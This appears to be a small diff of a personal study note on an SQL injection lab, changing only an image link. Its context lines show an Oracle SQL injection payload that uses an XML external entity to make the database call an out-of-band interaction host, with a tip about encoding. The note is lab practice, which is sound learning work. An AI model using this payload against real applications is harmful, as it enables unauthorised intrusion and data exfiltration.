@@ -6,7 +6,7 @@
 ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://b9lgosxai5adgeuxb0c8qn6fs6yxmoad.oastify.com/"> %remote;]>'),'/l') FROM dual--
 ```
 
-![[attachments/sqli-lab-16/file-20260204142639776.png]]
+![[attachments/sqli-lab-16/file-20260206135416464.png]]
 
 > [!tip] "Be careful of the encoding here"
 
